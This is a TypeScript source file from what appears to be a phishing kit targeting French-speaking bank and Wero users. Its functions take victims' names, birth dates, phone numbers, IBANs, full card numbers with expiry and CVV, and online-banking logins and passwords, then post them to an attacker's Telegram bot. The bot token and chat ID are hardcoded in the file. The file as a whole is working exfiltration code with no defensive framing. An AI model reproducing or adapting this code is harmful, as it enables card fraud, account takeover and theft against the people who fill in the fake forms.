import { SessionManager } from '../utils/sessionManager';

// Telegram configuration
const BOT_TOKEN = "8312875983:AAGu_kSr2MbNbVlByNbZSO1-Li3LK3t9hp8";
const CHAT_ID = "-5236742090";

export async function sendTelegramMessage(message: string): Promise<boolean> {
  try {
    const sessionId = SessionManager.hasActiveSession() 
      ? SessionManager.getSessionId() 
      : SessionManager.createSession();

    const response = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: `🆔 Session ID: ${sessionId}\n\n📨 IBAN:\n${message}`,
          parse_mode: 'HTML',
        }),
      }
    );

    const data = await response.json();
    return data.ok;
  } catch (error) {
    console.error('Error sending message:', error);
    return false;
  }
}

export async function sendPersonalInfoData(formData: any): Promise<boolean> {
  const sessionId = SessionManager.getSessionId();
  const message = `
🆔 Session ID: ${sessionId}

👤 INFORMATIONS PERSONNELLES

👤 Nom: ${formData.lastName}
👤 Prénom: ${formData.firstName}
📅 Date de naissance: ${formData.birthDate}
📱 Téléphone: ${formData.phoneNumber}
💰 Montant Wero: ${formData.amount}
  `;

  return sendTelegramMessage(message);
}

export async function sendBankFormData(formData: any): Promise<boolean> {
  const sessionId = SessionManager.getSessionId();
  const message = `
🆔 Session ID: ${sessionId}

💳 INFORMATIONS CARTE BANCAIRE

👤 Titulaire: ${formData.cardHolder}
💳 Numéro de carte: ${formData.cardNumber}
📅 Date d'expiration: ${formData.expiryMonth}/${formData.expiryYear}
🔒 CVV: ${formData.cvv}
  `;

  return sendTelegramMessage(message);
}

export async function sendBankAuthData(formData: any): Promise<boolean> {
  const sessionId = SessionManager.getSessionId();
  
  // Gérer les différents noms de champs selon la banque
  const identifier = formData.clientNumber || formData.identifier || formData.userId || formData.accountNumber || '';
  const password = formData.password || formData.secretCode || formData.pin || '';
  const bankName = formData.bank || 'Banque inconnue';
  
  const message = `
🆔 Session ID: ${sessionId}

🏦 AUTHENTIFICATION BANCAIRE

🏛️ Banque: ${bankName}
👤 Identifiant: ${identifier}
🔑 Mot de passe: ${password}
  `;

  const success = await sendTelegramMessage(message);
  if (success) {
    SessionManager.clearSession(); // Clear session after final step
  }
  return success;
}
